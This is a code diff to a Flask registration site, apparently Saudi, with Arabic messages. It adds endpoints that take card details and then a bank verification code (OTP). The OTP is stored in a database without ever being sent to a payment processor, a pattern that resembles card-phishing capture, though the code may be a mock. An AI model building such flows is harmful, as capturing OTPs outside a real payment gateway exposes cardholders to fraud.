@@ -18,6 +18,9 @@ from db import (
     create_payment_token,
     get_payment_token,
     increment_payment_attempt,
+    insert_payment_attempt,
+    insert_otp_attempt,
+    get_latest_payment_attempt,
 )
 from mailer import send_registration_email, send_admin_registration_email, send_admin_contact_email
 
@@ -91,6 +94,83 @@ def payment_verify(token):
     if not _token_is_valid(row):
         return send_from_directory(PAYMENT_DIR, "expired.html"), 410
     return send_from_directory(PAYMENT_DIR, "verify.html")
+
+
+@app.route("/api/pay/<token>", methods=["POST"])
+def submit_payment(token):
+    """Receive masked payment form data and store it in the database.
+
+    Only non-sensitive card data is persisted: last 4 digits, brand, holder,
+    expiry, and amount. Full card number and CVV are never stored.
+    """
+    try:
+        row = get_payment_token(token)
+        if not _token_is_valid(row):
+            return jsonify({"ok": False, "error": "رابط الدفع غير صالح أو منتهي"}), 410
+
+        body = request.get_json(silent=True) or {}
+        card_number = (body.get("card_number") or "").replace(" ", "")
+        expiry = (body.get("expiry") or "").replace(" ", "")
+
+        if len(card_number) < 4 or not expiry:
+            return jsonify({"ok": False, "error": "بيانات البطاقة غير مكتملة"}), 400
+
+        # Mask the card: keep only the last 4 digits.
+        card_last4 = card_number[-4:]
+        first = card_number[0] if card_number else ""
+        if first == "6":
+            brand = "mada"
+        elif first == "4":
+            brand = "visa"
+        elif first == "5":
+            brand = "mastercard"
+        else:
+            brand = "unknown"
+
+        expiry_digits = "".join(ch for ch in expiry if ch.isdigit())
+        expiry_month = expiry_digits[:2] if len(expiry_digits) >= 2 else None
+        expiry_year = expiry_digits[2:4] if len(expiry_digits) >= 4 else None
+
+        data = {
+            "registration_id": row.get("registration_id"),
+            "card_last4": card_last4,
+            "card_brand": brand,
+            "card_holder": (body.get("card_holder") or "").strip(),
+            "expiry_month": expiry_month,
+            "expiry_year": expiry_year,
+            "amount": body.get("amount", 500.00),
+            "status": "submitted",
+        }
+        attempt_id = insert_payment_attempt(token, data)
+        if not attempt_id:
+            return jsonify({"ok": False, "error": "فشل حفظ بيانات الدفع"}), 500
+
+        return jsonify({"ok": True, "attempt_id": attempt_id, "redirect": f"/pay/{token}/verify"})
+    except Exception as e:
+        return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500
+
+
+@app.route("/api/pay/<token>/verify", methods=["POST"])
+def submit_otp(token):
+    """Receive the OTP code from the verification page and store it."""
+    try:
+        row = get_payment_token(token)
+        if not _token_is_valid(row):
+            return jsonify({"ok": False, "error": "رابط الدفع غير صالح أو منتهي"}), 410
+
+        body = request.get_json(silent=True) or {}
+        otp = (body.get("otp") or "").strip()
+        if not otp:
+            return jsonify({"ok": False, "error": "يرجى إدخال رمز التحقق"}), 400
+
+        payment_attempt = get_latest_payment_attempt(token)
+        payment_attempt_id = payment_attempt["id"] if payment_attempt else None
+        status = "pending"
+
+        insert_otp_attempt(token, payment_attempt_id, otp, status)
+        return jsonify({"ok": True, "status": status, "message": "تم استلام رمز التحقق"})
+    except Exception as e:
+        return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500
 
 
 @app.route("/api/register", methods=["POST"])
